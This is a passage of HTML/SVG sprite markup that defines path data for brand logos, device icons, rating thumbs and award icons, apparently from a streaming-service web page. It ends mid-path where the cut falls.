                    <path d="M108.767 12.767h.2c.232 0 .432-.067.432-.267 0-.167-.133-.3-.4-.3-.1 0-.2.033-.232.033v.534zm0 1.067h-.434v-1.867c.167-.033.4-.067.7-.067.366 0 .5.067.667.134.1.1.166.233.166.4 0 .233-.166.366-.4.433v.033c.2.067.3.2.367.467.033.267.066.4.133.467h-.467c-.066-.067-.1-.234-.166-.467-.034-.2-.134-.3-.366-.3h-.2v.767zm-1.167-1c0 .833.633 1.5 1.467 1.5.8 0 1.4-.667 1.4-1.467 0-.833-.6-1.5-1.433-1.5-.801 0-1.434.667-1.434 1.467zm3.366 0c0 1.067-.833 1.9-1.932 1.9-1.067 0-1.901-.833-1.901-1.9 0-1.034.834-1.867 1.9-1.867 1.1 0 1.933.833 1.933 1.867zm-39.733-1.867l-9.8 9.833v-9.865H52.9V36h8.533V25.833L71.667 36h10.732L69.366 22.934l10.8-10.767v14.867c0 4.933 2.967 9.466 10.467 9.466 3.534 0 6.8-2 8.367-3.833L102.833 36h1.833V10.967h-8.533v16.2c-.966 1.667-2.3 2.733-4.367 2.733-2.1 0-3.066-1.233-3.066-5.233v-13.7H71.233zM38.1 16.634c-2.267 0-4.167 3.067-4.167 6.833 0 3.8 1.9 6.866 4.167 6.866 2.3 0 4.2-3.066 4.2-6.866 0-3.766-1.9-6.833-4.2-6.833zm13.133 6.833c0 7.233-5.9 13.033-13.133 13.033-7.234 0-13.1-5.8-13.1-13.033 0-7.234 5.866-13.033 13.1-13.033 7.233 0 13.133 5.8 13.133 13.033zM16.466 14.7c0-2.968-2.366-5.367-5.3-5.367H8.534v10.7h2.634c2.933 0 5.3-2.4 5.3-5.333zm12 21.332H18.8l-7.7-10.7H8.533V36H0V4h12.2C19.267 4 25 8.801 25 14.7c0 3.6-2.2 6.8-5.533 8.767l9 12.566z"></path>
                </symbol>
                <symbol viewBox="0 0 80 40" id="logo-wii">
                    <path d="M76.798 36.133h.4V33.5l.967 2.633h.367l.967-2.633h.033v2.633h.366V33h-.566l-.967 2.633-1-2.633h-.567v3.133zm-1.832 0h.433v-2.8h1.032V33h-2.5v.333h1.035v2.8zm-10.401 0h6.766V14h-6.766v22.133zM67.931 2c-2.2 0-4 1.8-4 4.034 0 2.2 1.8 4 4 4 2.234 0 4.034-1.8 4.034-4 0-2.233-1.8-4.034-4.034-4.034zM50.232 36.133H57V14h-6.767v22.133zM53.632 2a4.027 4.027 0 0 0-4.034 4.034c0 2.2 1.801 4 4.035 4 2.2 0 3.999-1.8 3.999-4 0-2.233-1.8-4.034-4-4.034zM46.4 4.134l-7.6 26.8s-1.034 5.566-5.4 5.566c-4.367 0-5.4-5.567-5.4-5.567l-4.8-17.466-4.833 17.466S17.333 36.5 13 36.5c-4.367 0-5.4-5.567-5.4-5.567L0 4.133h7.166L13.4 27.968S17.232 13.5 18.366 8.633c1.166-4.866 4.834-4.8 4.834-4.8s3.666-.066 4.799 4.8c1.166 4.867 5 19.334 5 19.334l6.233-23.833h7.167z"></path>
                </symbol>
                <symbol viewBox="0 0 104 40" id="logo-xbox">
                    <path d="M103.332 29.134l-6.7-9.367 6.333-8.867.267-.366H100.7l-.067.1-5.133 7.466-4.967-7.466-.1-.1H87.833l.233.366 6.1 8.834-6.467 9.432-.266.334h2.566l.066-.1 5.434-7.867 5.334 7.867.066.1h2.666l-.233-.366zM83.766 14.5c1.066 1.566 1.6 3.433 1.6 5.5 0 2.066-.534 3.9-1.6 5.466-1.067 1.6-2.767 2.434-5.033 2.467-2.3-.033-4-.867-5.067-2.467-1.067-1.566-1.634-3.4-1.6-5.467-.034-2.066.533-3.933 1.6-5.5 1.067-1.6 2.766-2.4 5.067-2.467 2.266.067 3.966.867 5.033 2.468zm1.6 12.333c1.467-1.867 2.2-4.2 2.2-6.834 0-2.666-.733-5-2.2-6.933-1.466-1.934-3.7-2.933-6.633-3-2.934.067-5.167 1.066-6.634 3-1.5 1.934-2.233 4.233-2.233 6.933 0 2.667.734 4.967 2.2 6.834 1.5 2 3.733 3.032 6.667 3.066 2.933-.034 5.167-1.066 6.632-3.066zm-29.333-6.2l1.633-.034H61.8c3.034.033 4.533 1.134 4.566 3.367 0 1.366-.432 2.3-1.3 2.833-.8.5-1.832.767-3.033.767h-5.999v-6.934zm0-8.134h5.766c2.6 0 3.867 1.067 3.867 3.233 0 .834-.3 1.501-.933 2.034-.634.567-1.634.867-2.934.9h-5.766V12.5zm9.4 16.4c.9-.4 1.6-.9 2.066-1.466.433-.567.767-1.2.9-1.834.133-.6.167-1.1.167-1.6-.034-2.4-1.167-3.933-3.333-4.566.7-.3 1.266-.767 1.732-1.367.601-.8.901-1.734.901-2.766-.034-1.801-.667-3.068-1.866-3.768-1.134-.667-2.5-1-4.1-1h-8.068v8.134h-2.5l-1.366 1.966h3.866V29.5H61.8c1.5 0 2.734-.2 3.634-.6zm-12.634.234l-6.7-9.367 6.334-8.867.266-.366h-2.5l-.066.1-5.167 7.466L40 10.634l-.067-.1H37.333l.233.366 6.1 8.834-6.5 9.432-.233.334h2.533l.067-.1 5.433-7.867 5.367 7.867.066.1H53.066l-.267-.366zM7.3 6.534c.033 0 .067-.034.067-.034 2.5-1.633 5.4-2.5 8.6-2.5 3 0 5.833.834 8.234 2.267.167.1.633.433.9.733h-.034c-.3-.333-.7-.533-1.133-.633-.934-.067-2.067.133-3.268.6C18.266 8.034 15.9 9.901 15.9 9.901v.066c-.3-.266-.6-.5-.934-.766-1.967-1.434-3.8-2.4-5.2-2.8-.467-.134-.9-.167-1.3-.134h-.333c-.067.033-.134.033-.2.066-.067 0-.1 0-.134.034-.067 0-.1 0-.133.033-.133.033-.267.1-.367.133zM31.966 20c0 8.834-7.166 16-16 16S0 28.834 0 20c0-4.234 1.633-8.1 4.3-10.933 0 0 .7-.833 1.766-.9 3.267.266 6.9 4.266 6.9 4.266-1.8 1.734-6.166 7.035-7.6 10.567-2.2 5.4-1.2 7.767-1.2 7.767.267-2.966 4.767-8.234 6.334-9.934.9-.932 2.5-2.532 3.7-3.8l1.7-1.7c.5.467.966.933 1.4 1.367 2.033 2 3.566 3.666 4.566 4.833 1.033 1.134 2.9 3.367 3.4 4.067 2.166 3.034 2.5 5.134 2.5 5.134.833-4.1-.533-7.067-2.866-10.833-1.8-2.9-4.467-5.801-5.6-6.934-.167-.133-.334-.3-.5-.434v-.066c3.266-3.066 5.9-4.1 6.632-4.333.667-.067 1.434.066 2.067.766.067.067.134.134.2.234C30.367 11.967 31.967 15.8 31.967 20z"></path>
                </symbol>
                <symbol viewBox="0 0 49 34" id="mobile-device">
                    <path d="M39.167 32.133a.727.727 0 0 1-.7-.7c0-.4.333-.733.7-.733.4 0 .732.332.732.733 0 .367-.332.7-.732.7zM40.1 18.6c-.333-.2-.9-.534-1.266-.7l-.801-.5c-.333-.234-.633-.034-.633.333V21.1c0 .4.3.566.633.367l.8-.467c.367-.2.934-.533 1.267-.733l.833-.467c.334-.2.334-.534 0-.734L40.1 18.6zm6.267 10.8c0 .234-.2.4-.4.4h-13.6c-.2 0-.367-.166-.367-.4V8.566c0-.233.167-.4.367-.4h13.6c.2 0 .4.167.4.4V29.4zm-9.9-22.667h-4.334c-.833 0-1.532.667-1.532 1.5v23.234c0 .833.7 1.533 1.532 1.533h14.1c.834 0 1.534-.7 1.534-1.534V8.233c0-.833-.7-1.5-1.534-1.5h-9.767zM20.733 14.2c-.334-.167-.9-.5-1.267-.7l-.8-.467c-.334-.233-.634-.034-.634.333v3.368c0 .4.3.532.634.365l.8-.5c.367-.166.933-.5 1.267-.733l.833-.433c.332-.233.332-.567 0-.733l-.833-.5zM2.8 28.967c-1 0-1.8-.8-1.8-1.8V2.832C1 1.833 1.8 1 2.8 1h31.867c1 0 1.8.833 1.8 1.833v3.9h-2.734v-3h-30v22.5h26.868v2.734H2.8z"></path>
                </symbol>
                <symbol viewBox="0 0 111 30" id="netflix-logo">
                    <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"></path>
                </symbol>
                <symbol viewBox="0 0 57 34" id="pc-device">
                    <path d="M26.933 17.266v-3.5c0-.567.4-.8.9-.533l1.2.7L30.867 15l1.167.667c.5.3.5.766 0 1.067l-1.167.7c-.5.265-1.332.732-1.832 1.032l-1.2.7c-.5.3-.9.034-.9-.533v-1.367zm4.3 13.9h-5.366c-.3 0-.567.234-.567.567 0 .3.267.533.567.533h5.366c.3 0 .567-.233.567-.533a.562.562 0 0 0-.567-.567zM9.5 28.933h38.1V3.466H9.5v25.467zM54.8 33H2.334C1.6 33 1 32.4 1 31.666c0-.7.6-1.3 1.334-1.3h4.7V3.235C7.034 2 8.034 1 9.267 1h38.566c1.233 0 2.233 1 2.233 2.234v27.133H54.8c.733 0 1.3.6 1.3 1.3 0 .733-.567 1.333-1.3 1.333z"></path>
                </symbol>
                <symbol viewBox="0 0 63 48" id="icon-price-tag">
                    <g>
                        <path d="M35.752 7.65c-1.1 0-2.1.45-2.85 1.2a3.97 3.97 0 0 0 .1 5.651c.75.7 1.7 1.1 2.75 1.1a4.01 4.01 0 0 0 2.851-1.2c.75-.8 1.149-1.8 1.1-2.85 0-1.05-.451-2.05-1.201-2.8a4.072 4.072 0 0 0-2.75-1.1m-.002 9.15c-1.35 0-2.65-.5-3.6-1.45-2.05-1.95-2.101-5.25-.15-7.3 1-1.05 2.3-1.6 3.75-1.6 1.35 0 2.6.5 3.6 1.45.95.95 1.55 2.25 1.55 3.65.05 1.35-.5 2.65-1.45 3.65-.95 1.05-2.3 1.6-3.7 1.6m-2.148 9.701a.727.727 0 0 1-1.05 0l-5.3-5.05c-.3-.3-.3-.75 0-1.05.25-.3.75-.3 1.05-.05l5.25 5.1c.3.3.3.75.05 1.05m-5.95-10.05l-4.55.098v-1.799c0-.4-.35-.7-.75-.7-.401 0-.701.3-.701.7l.05 2.55c0 .3.2.55.45.65.101.05.15.05.25.05l5.301-.1c.4 0 .7-.3.7-.7 0-.4-.35-.75-.75-.75m.1 16.15a.723.723 0 0 1-1.05 0l-5.301-5.099c-.3-.25-.3-.75 0-1.05.25-.25.75-.3 1 0l5.301 5.1c.3.25.3.75.05 1.05m-5.951-10.05l-4.55.1v-1.8c-.05-.4-.35-.75-.75-.75-.4.05-.75.35-.7.75v2.55c.05.3.2.55.5.65.05.05.15.05.25.05l5.25-.1c.4 0 .75-.35.75-.75s-.35-.7-.75-.7m.25 15.95c-.299.3-.75.3-1.049 0l-5.301-5.1c-.3-.25-.3-.75 0-1.05.3-.25.75-.3 1.05 0l5.251 5.1c.299.25.35.75.049 1.05m-5.95-10.05l-4.5.1-.05-1.8c0-.4-.35-.75-.75-.75-.401.05-.7.35-.7.75l.049 2.55c0 .3.201.55.451.65.1.05.2.05.3.05l5.25-.1c.4 0 .7-.35.7-.75s-.35-.7-.75-.7M43.903 4.9c0-.5-.122-.876-.35-1.1-.279-.274-.65-.3-.85-.3H42.402c-.799.05-1.85.05-3.049.05-5.551 0-13.151-.35-13.851-.35-.15 0-.3.05-.45.2L1.4 27.952c-.1.15-.2.3-.2.5s.1.35.25.5l18.301 17.65c.25.25.751.25 1.001-.05l23.651-24.55c.153-.197.198-.488.2-.7M20.252 48.002a1.937 1.937 0 0 1-1.351-.55L.6 29.801c-.35-.349-.6-.799-.6-1.299 0-.55.2-1 .55-1.4L24.202 2.548c.3-.299.699-.5 1.15-.549h.15c.1 0 8.1.35 13.851.35 1.149 0 2.149 0 3-.05h.35c.7 0 1.3.2 1.75.65.45.45.65 1.1.65 1.95.05.85.705 14.126.65 16.551-.011.502-.15 1-.5 1.4L21.602 47.403c-.35.35-.85.6-1.35.6"></path>
                        <path d="M62.004 0c-2.95 6.4-12.651 6.4-12.651 6.4-7.05.1-10.951 2.25-12.751 3.601-.7-.351-1.55-.2-2.1.35-.7.7-.65 1.85.05 2.549.7.651 1.85.651 2.5-.049.55-.55.65-1.3.4-1.951 5.05-3.5 11.9-3.299 11.9-3.299C60.105 7.601 62.855.6 62.855.6l-.85-.6z"></path>
                    </g>
                </symbol>
                <symbol viewBox="0 0 91 48" id="icon-cross-device-screens-small">
                    <path d="M70.979 45.508V48h-1.396v-2.542H49.895v-1.395h19.688c.798 0 1.396.647 1.396 1.445zM90.717 1.396V41.62c0 .748-.648 1.396-1.495 1.396H49.895V41.62h39.327V1.396H20.088v13.109h-1.397V1.395C18.691.599 19.29 0 20.088 0h69.134c.847 0 1.495.598 1.495 1.396zm-39.078 45.01v.697c0 .498-.798.897-1.744.897H13.608v-1.595h38.031zM5.035 44.71c0-.398.299-.747.698-.747.398 0 .747.349.747.747 0 .4-.349.697-.747.697a.68.68 0 0 1-.698-.697zm-.947-20.037v-6.728c0-.799.648-1.447 1.445-1.447h41.221c.748 0 1.396.648 1.396 1.447v26.018c0 .797-.648 1.395-1.396 1.395H13.608v-1.395h33.096V17.894H5.534v6.78H4.087zM1.446 46.604h8.772V27.913H1.446v18.691zm10.218-18.691v18.642c0 .797-.598 1.445-1.446 1.445H1.396C.648 48 0 47.352 0 46.555V27.913c0-.797.648-1.397 1.396-1.397h8.822c.848 0 1.446.6 1.446 1.397z"></path>
                </symbol>
                <symbol viewBox="0 0 145 48" id="icon-cross-device-screens-desktop">
                    <path d="M138.211 44.009c-.398 0-.697.349-.697.748 0 .398.3.698.697.698.4 0 .749-.3.749-.698 0-.4-.35-.748-.749-.748zm-4.19 2.593h8.682V28.191h-8.682v18.411zm-.05-19.807h8.732c.798 0 1.396.598 1.396 1.396v18.362c0 .798-.598 1.447-1.396 1.447h-8.732c-.749 0-1.397-.649-1.397-1.447V28.191c0-.798.648-1.396 1.397-1.396zM74.095 44.009h48.7V13.173h-48.7v30.836zm0-32.233h48.75c.748 0 1.396.648 1.396 1.446v30.787c0 .798-.648 1.396-1.397 1.396H74.095c-.797 0-1.396-.598-1.396-1.396V13.222c0-.798.599-1.446 1.396-1.446zm56.583 34.677v.649c0 .499-.799.898-1.747.898H67.66c-.998 0-1.746-.4-1.746-.898v-.649h64.764zm-111.567.898v-2.445c0-.798.648-1.446 1.396-1.446h29.688c.799 0 1.397.648 1.397 1.446v2.445h-1.397v-2.494H20.557v2.494H19.11zM1.397 41.065h68.208V1.397H1.397v39.668zM1.397 0h68.208c.799 0 1.447.599 1.447 1.397v39.668c0 .748-.648 1.396-1.447 1.396H1.397A1.394 1.394 0 0 1 0 41.065V1.397C0 .599.599 0 1.397 0z"></path>
                </symbol>
                <symbol viewBox="0 0 44 44" id="rating-thumbs-up">
                    <path d="M36.2259059,39.0138889 C36.2259059,41.128741 34.2435159,41.8394049 32.6453354,41.9746203 L21.0300552,42 C11.6911102,42 12.1611411,39.0138889 5,38.4166667 L5,24.0833333 L10.073607,21.1623699 L16.2619026,9.95583842 C16.2619026,9.95583842 16.9677739,0.974629541 16.9677739,0.480247712 C16.9677739,0.480247712 22.5402979,-2.23393403 23.9216431,5.2426348 C25.3029884,12.7192036 24.344293,17.3331909 24.0839076,17.9993896 L36.2134373,18.0247694 C37.8116178,18.1599847 39.8064765,18.9823701 39.8064765,21.0972222 C39.8064765,23.2120744 37.8240865,23.9227383 36.2259059,24.0579536 L37.4194295,24.0833333 C39.01761,24.2439284 41,24.9545923 41,27.0694444 C41,29.1842966 39.01761,29.8949605 37.4194295,30.0301758 L35.0323824,30.0555556 C36.6305629,30.2161506 38.612953,30.9268145 38.612953,33.0416667 C38.612953,35.1565188 36.6305629,35.8671827 35.0323824,36.002398 L32.6453354,36.0277778 C34.2435159,36.1883728 36.2259059,36.8990367 36.2259059,39.0138889 Z"></path>
                </symbol>
                <symbol viewBox="0 0 44 44" id="rating-thumbs-down">
                    <path d="M7.77409406,4.98611111 C7.77409406,2.87125897 9.75648409,2.16059507 11.3546646,2.02537973 L22.9699448,2 C32.3088898,2 31.8388589,4.98611111 39,5.58333333 L39,19.9166667 L33.926393,22.8376301 L27.7380974,34.0441616 C27.7380974,34.0441616 27.0322261,43.0253705 27.0322261,43.5197523 C27.0322261,43.5197523 21.4597021,46.233934 20.0783569,38.7573652 C18.6970116,31.2807964 19.655707,26.6668091 19.9160924,26.0006104 L7.78656274,25.9752306 C6.18838222,25.8400153 4.19352352,25.0176299 4.19352352,22.9027778 C4.19352352,20.7879256 6.17591354,20.0772617 7.77409406,19.9420464 L6.58057055,19.9166667 C4.98239002,19.7560716 3,19.0454077 3,16.9305556 C3,14.8157034 4.98239002,14.1050395 6.58057055,13.9698242 L8.96761758,13.9444444 C7.36943706,13.7838494 5.38704703,13.0731855 5.38704703,10.9583333 C5.38704703,8.84348119 7.36943706,8.13281729 8.96761758,7.99760195 L11.3546646,7.97222222 C9.75648409,7.81162716 7.77409406,7.10096325 7.77409406,4.98611111 Z"></path>
                </symbol>
                <symbol viewBox="0 0 34 37" id="thumbs-down">
                    <path d="M30.9 6.933V21.9c-1.5 1-3.2 1.134-5.133.4V7c1.633-.567 3.366-.6 5.132-.067M6.767 4c2.833.067 5.633.534 7.999 1.034 3.5.733 4.267 1.067 7.733 1.932v15.767c-1.4 1.933-3.666 3.767-5.732 5.167-1.1.734-2.167 1.433-3.268 2.2-2.2 1.5-4.466 3.567-5.966 5.9-1-2.333-1.2-4.367-.4-6.367C7.867 27.667 8.5 26.7 10.1 24.6 7.933 23.933 3.167 22.533 1 21.9c.533-4.8 1.667-8.167 5.767-17.9"></path>
                </symbol>
                <symbol viewBox="0 0 34 37" id="thumbs-up">
                    <path d="M26.134 33c-2.834-.067-5.634-.534-7.968-1.034-3.532-.733-4.3-1.067-7.766-1.932v-15.8c1.4-1.9 3.667-3.734 5.8-5.134l3.2-2.2c2.2-1.5 4.467-3.567 5.967-5.9 1 2.333 1.2 4.367.4 6.367C25.033 9.333 24.4 10.3 22.8 12.4c2.167.666 6.967 2.066 9.1 2.699-.533 4.8-1.633 8.167-5.766 17.9M2 30.067V15.1c1.5-1 3.233-1.134 5.134-.4V30c-1.634.567-3.367.6-5.134.067"></path>
                </symbol>
                <symbol viewBox="0 0 49 34" id="tv-device">
                    <path d="M22.6 17.733v-3.7c0-.433.3-.633.7-.4l.9.534c.399.2 1 .567 1.4.8l.9.533c.4.2.4.567 0 .8l-.9.5c-.4.233-1.001.6-1.4.8l-.9.533c-.4.234-.7.067-.7-.4zM3.6 26.5h41.432V3.567H3.6V26.5zM47.632 3.1v23.866c0 1.167-.934 2.1-2.1 2.1H28.565c0 .667.234 1.568 1.334 2.2h3.533a.86.86 0 0 1 .867.867c0 .467-.4.867-.867.867H15.2a.882.882 0 0 1-.867-.867c0-.5.4-.867.867-.867h3.533c1.1-.632 1.333-1.533 1.333-2.2H3.1c-1.167 0-2.1-.933-2.1-2.1V3.101C1 1.934 1.933 1 3.1 1h42.432c1.167 0 2.1.934 2.1 2.1z"></path>
                </symbol>
                <symbol viewBox="0 0 34 34" id="x-circle">
                    <path d="M25.2 9.933L24.066 8.8a1.53 1.53 0 0 0-2.167 0L17 13.666 12.1 8.8c-.6-.6-1.567-.6-2.167 0L8.8 9.933c-.6.6-.6 1.567 0 2.167l4.9 4.9-4.9 4.9c-.6.6-.6 1.567 0 2.167L9.933 25.2c.6.6 1.567.6 2.167 0l4.9-4.9 4.9 4.9c.6.6 1.567.6 2.166 0l1.134-1.133c.6-.6.6-1.568 0-2.168L20.3 17l4.9-4.9c.6-.6.6-1.566 0-2.166M33 17c0 8.834-7.166 16-16 16S1 25.834 1 17 8.166 1 17 1s16 7.166 16 16"></path>
                </symbol>
                <symbol viewBox="0 0 10 10" id="x-mark">
                    <path d="M6.899 5.01l2.823 2.823A.846.846 0 0 1 10 8.45c0 .22-.099.457-.278.636l-.656.656a.91.91 0 0 1-.616.26c-.22 0-.458-.101-.637-.26L4.99 6.92 2.167 9.742a.91.91 0 0 1-.617.26c-.218 0-.456-.101-.636-.26l-.656-.656A.997.997 0 0 1 0 8.45c0-.22.099-.458.258-.617L3.082 5.01.258 2.187A.997.997 0 0 1 0 1.551c0-.22.099-.457.258-.617L.914.278A.933.933 0 0 1 1.55 0c.22 0 .458.1.617.278L4.99 3.102 7.813.278A.932.932 0 0 1 8.45 0c.218 0 .457.1.616.278l.656.656c.179.16.278.398.278.617a.924.924 0 0 1-.278.636L6.899 5.01z"></path>
                </symbol>
                <symbol viewBox="0 0 18 27" id="icon-download">
                    <g fill="none" fill-rule="evenodd">
                        <path d="M6 15.2l3 3 3-3M9 8v9" stroke-linecap="square" stroke-width="2" stroke="currentColor"></path>
                        <path d="M9.8 25.4c0-.4-.4-.8-.8-.8s-.8.4-.8.8.4.7.8.7.8 0 .8-.3m6.3-24H2c-.4 0-.5.3-.5.5v21.4c0 .2 0 .4.4.4h14s.2-.2.2-.4V2c0-.3-.2-.5-.4-.5m2 0v24c0 .8-.8 1.5-1.7 1.5H1.7c-1 0-1.6-.7-1.6-1.6v-24C0 .8.7 0 1.6 0h14.8c1 0 1.6.7 1.6 1.5"
                            fill="currentColor"></path>
                    </g>
                </symbol>
                <symbol viewBox="0 0 263 262" id="awards-icon">
                    <path d="M153.4 142.2C158.5 123.3 163.6 98 165.4 69.9 167.2 69.9 169 69.9 171 70.5 179.5 72.8 182.3 76.1 182.3 84 182.3 87.8 186.1 94.7 180.2 106.5 174.4 118.4 160.6 136.8 153.4 142.2L153.4 142.2ZM96.5 69.7C98.5 97.8 103.6 123.1 108.5 141.9 101.4 136.6 87.8 118.2 81.9 106.2 76.1 94.5 79.7 87.6 79.7 83.7 79.7 75.8 82.5 72.5 91.1 70.2 92.9 69.7 94.7 69.7 96.5 69.7L96.5 69.7ZM142.7 176.7C142.7 176.7 146.3 167.7 150.6 152.9 160.6 149.6 179.7 126.4 188.4 111 195.3 99 192.7 92.4 192.7 86.5 192.7 70.7 184.1 63.8 173.9 60.7 171 60 168.5 59.7 165.9 59.7 166.2 55.9 166.2 52.1 166.2 48L96 48 96 59.5C93.4 59.5 90.9 59.7 88.3 60.5 78.1 63.6 69.4 70.5 69.4 86.3 69.4 92.2 66.6 98.8 73.5 110.8 82.5 126.1 101.4 149.3 111.6 152.7 115.6 167.7 119.2 176.7 119.2 176.7L96 176.7 96 188.4 72.5 188.4 72.5 212.6 189.7 212.6 189.7 188.4 166.2 188.4 166.2 176.7 142.7 176.7ZM262.2 130.7C262.2 202.7 203.5 261.4 131.2 261.4 58.7 261.4 0 202.7 0 130.7 0 58.5 58.7 0 131.2 0 203.5 0 262.2 58.5 262.2 130.7L262.2 130.7Z"></path>
                </symbol>
                <symbol viewBox="0 0 50 50" id="nmodp-play-button">
                    <path d="M25 50C11.2 50 0 38.8 0 25 0 11.2 11.2 0 25 0 38.8 0 50 11.2 50 25 50 38.8 38.8 50 25 50ZM35.3 25L19.7 16.4 19.7 33.6 35.3 25Z"></path>
                </symbol>
                <symbol viewBox="0 0 14 23" id="n-logo">
                    <defs>
                        <linearGradient x1="38.6443641%" y1="66.5993888%" x2="61.346965%" y2="65.4165336%" id="linearGradient-1">
                            <stop stop-color="#7C020D" offset="0%"></stop>
                            <stop stop-color="#B20710" offset="100%"></stop>
                        </linearGradient>
                        <linearGradient x1="71.1033877%" y1="38.2760866%" x2="44.118143%" y2="39.6334986%" id="linearGradient-2">
                            <stop stop-color="#7C020D" offset="0%"></stop>
                            <stop stop-color="#B20710" offset="100%"></stop>
                        </linearGradient>
                    </defs>
                    <g id="Mobile" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                        <g id="Film" transform="translate(-16.000000, -902.000000)">
                            <g id="Fixed-Header-Collapsed" transform="translate(0.000000, 885.000000)">
                                <g id="N-icon" transform="translate(16.000000, 17.000000)">
                                    <path d="M8.58666667,0 L8.58666667,4.71163104 L8.58666667,10.8268835 L8.58666667,11.9705978 C8.72715209,12.3613802 9.32149908,14.0200547 9.47366041,14.4377494 C9.75787802,15.2343065 11.3757081,19.7306385 11.5050172,20.0903918 C11.6209645,20.4130945 11.9438936,21.3102964 12.0465417,21.5974231 C12.1065445,21.7635056 12.263139,22.1982203 12.3464312,22.430109 C12.4114916,22.6113682 12.4056848,22.5964988 12.4459573,22.7086337 C12.5037749,22.7314907 13.0587235,22.9528112 13.1383944,22.9847005 C13.1600603,22.9933026 13.1564389,22.9917665 13.1609345,22.9935484 C13.1704875,22.9972965 13.1736094,22.9986482 13.1770435,23 C13.1771059,22.8282647 13.1771683,22.5740718 13.1772308,22.3021217 L13.1772308,0 L8.58666667,0 Z"
                                        id="Fill-1" fill="url(#linearGradient-1)"></path>
                                    <path d="M0,1.59821386 L0,3.19863969 L0,9.20206451 L0,23 C1.82353842,22.7844553 2.73555738,22.700646 4.5905641,22.617574 L4.5905641,18.2883075 L4.5905641,12.1731165 L4.5905641,11.0294022 C4.45008059,10.6386198 0.914016946,0.801779732 0.83078827,0.569890951 C0.765666357,0.388631834 0.771535446,0.40356267 0.731201069,0.291427793 C0.673446737,0.268509267 0.11844321,0.047188814 0.0388358863,0.0152380545 C0.017170207,0.00669737074 0.0207291226,0.00823346495 0.0163585245,0.00645159567 C0.00674320856,0.0027035258 0.00362135275,0.0013517629 0.000187311349,0 C0.000124874233,0.171673889 6.24371163e-05,0.425928202 0,0.697816876 L0,1.59821386 Z"
                                        id="Fill-3" fill="url(#linearGradient-2)"></path>
                                    <path d="M4.57526789,0 L0,0 L8.10171278,22.6175146 C10.3784565,22.6742269 12.8139487,23 12.8139487,23 L4.57526789,0 Z" id="Fill-6" fill="#E50813"></path>
                                </g>
                            </g>
                        </g>
                    </g>
                </symbol>
                <symbol id="chevron" width="36px" height="11px" viewBox="0 0 36 11">
                    <g id="Cell-6" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                        <g id="Cell6---2" transform="translate(-142.000000, -545.000000)" fill="#FFFFFF">
                            <path d="M177.668,546.463 L160.678,555.577 C160.415,555.727 160.115,555.839 160.002,555.839 C159.89,555.839 159.74,555.802 159.703,555.802 C159.627,555.765 159.365,555.614 159.103,555.501 L142.3,546.463 C142.112,546.388 142,546.163 142,545.976 C142,545.901 142.037,545.825 142.075,545.713 L142.3,545.301 C142.412,545.113 142.6,545.001 142.787,545.001 C142.9,545.001 142.975,545.001 143.05,545.075 L159.478,553.89 C159.59,553.965 159.777,554.002 159.965,554.002 C160.152,554.002 160.34,553.965 160.452,553.89 L176.881,545.075 C177.143,544.925 177.481,545 177.631,545.3 L177.855,545.712 C178.006,545.976 177.931,546.313 177.668,546.463"
                                id="Fill-220"></path>
                        </g>
                    </g>
                </symbol>
                <symbol viewBox="0 0 100 100" id="circle-with-arrow">
                    <path d="M0 37.565h13.907A43.803 43.803 0 0 1 56.084 6a43.868 43.868 0 0 1 19.213 4.392C89.844 17.528 100 32.532 100 49.916c0 24.245-19.67 43.916-43.916 43.916-6.496 0-12.534-1.373-18.024-3.843l3.843-8.326.64.275c4.21 1.83 8.784 2.745 13.541 2.745 4.666 0 9.24-.915 13.45-2.745 4.208-1.739 7.868-4.209 11.07-7.411s5.764-6.953 7.502-11.07a36.062 36.062 0 0 0 2.653-13.541c0-4.666-.915-9.24-2.653-13.54-1.738-4.118-4.3-7.87-7.502-11.071-2.745-2.654-5.856-4.94-9.24-6.588l-1.83-.823c-4.21-1.83-8.784-2.745-13.45-2.745-4.757 0-9.332.915-13.54 2.745-4.21 1.738-7.869 4.208-11.071 7.41-3.202 3.203-5.672 6.954-7.502 11.071-.092.366-.275.732-.458 1.19h13.998L18.756 68.03 0 37.565z"></path>
                </symbol>
                <symbol id="awards-icon-v2" viewBox="0 0 39 31">
                    <path d="M37 20.9C37 20.9 35.3 20.6 33.7 21.1 34.2 20.2 34.6 19.4 34.9 18.5 35.1 18.4 35.2 18.4 35.3 18.3 35.7 18.2 36.1 17.9 36.7 17.4 38.2 16 38.6 14.1 38.6 14.1 38.6 14.1 37.1 14.4 35.6 15.3 35.7 14.7 35.8 14 35.8 13.3L35.8 13 36.2 12.8C36.3 12.7 36.4 12.6 36.4 12.5 36.7 12.3 36.9 11.8 37.2 11.1 37.9 9.3 37.4 7.4 37.4 7.4 37.4 7.4 36.1 8.2 35.3 9.7 35.1 8.6 34.7 7.6 34.2 6.6 34.3 6.6 34.4 6.5 34.4 6.4L34.6 6.1C34.7 5.7 34.7 5.2 34.7 4.5 34.8 2.5 33.7 0.9 33.7 0.9 33.7 0.9 32.7 2.2 32.5 4 30.9 3.1 29.2 3.2 29.2 3.2 29.2 3.2 30 5 31.7 6.1 32.3 6.5 32.7 6.7 33.1 6.8 33.3 6.9 33.4 6.9 33.6 6.9 33.7 6.9 33.8 6.9 33.9 6.8 34.3 7.7 34.7 8.6 34.9 9.6 33.7 8.5 32.4 8.1 32.4 8.1 32.4 8.1 32.4 10 33.7 11.6 34.2 12.2 34.5 12.5 34.8 12.7 34.9 12.8 35.1 12.9 35.2 12.9 35.3 13 35.3 13 35.4 13L35.4 13.3C35.4 13.9 35.4 14.4 35.3 14.9 